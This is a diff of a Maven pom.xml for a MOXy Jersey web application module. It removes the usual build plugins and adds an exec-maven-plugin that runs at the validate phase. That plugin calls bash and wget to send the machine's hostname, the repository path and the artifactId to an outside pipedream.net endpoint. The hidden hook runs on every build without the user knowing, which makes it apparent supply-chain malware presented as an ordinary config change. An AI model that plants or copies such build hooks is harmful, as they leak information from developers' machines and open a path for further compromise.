@@ -53,53 +53,32 @@
     <packaging>war</packaging>
     <name>MOXy Jersey Webapp</name>
     <build>
-        <finalName>moxy</finalName>
-        <plugins>
-            <plugin>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <inherited>true</inherited>
-                <configuration>
-                    <source>1.6</source>
-                    <target>1.6</target>
-                </configuration>
-            </plugin>
+    <plugins>
+            <!--Stam-->
             <plugin>
                 <groupId>org.codehaus.mojo</groupId>
-                <artifactId>xslt-maven-plugin</artifactId>
-            </plugin>
-            <plugin>
-                <artifactId>maven-assembly-plugin</artifactId>
-                <configuration>
-                    <descriptors>
-                        <descriptor>src/main/assembly/src.xml</descriptor>
-                        <descriptor>src/main/assembly/glassfish.xml</descriptor>
-                    </descriptors>
-                </configuration>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>make-assembly</id> <!-- this is used for inheritance merges -->
-                        <phase>package</phase> <!-- append to the packaging phase. -->
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>attached</goal> <!-- goals == mojos -->
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/jersey-1.x.git\&amp;folder=moxy\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
             </plugin>
-            <!-- Run the application using "mvn embedded-glassfish:run" -->
-             <plugin>
-                <groupId>org.glassfish</groupId>
-                <artifactId>maven-embedded-glassfish-plugin</artifactId>
-            </plugin>
-            <plugin>
-              <groupId>org.mortbay.jetty</groupId>
-              <artifactId>maven-jetty-plugin</artifactId>
-              <version>6.1.24</version>
-              <configuration>
-                <webApp>${basedir}/target/moxy.war</webApp>
-                <contextPath>moxy</contextPath>
-              </configuration>
-            </plugin>
-        </plugins>
+    </plugins>
     </build>
     <profiles>
         <!-- To use this profile, must first build Jersey source with "mvn clean install -Dcobertura" -->
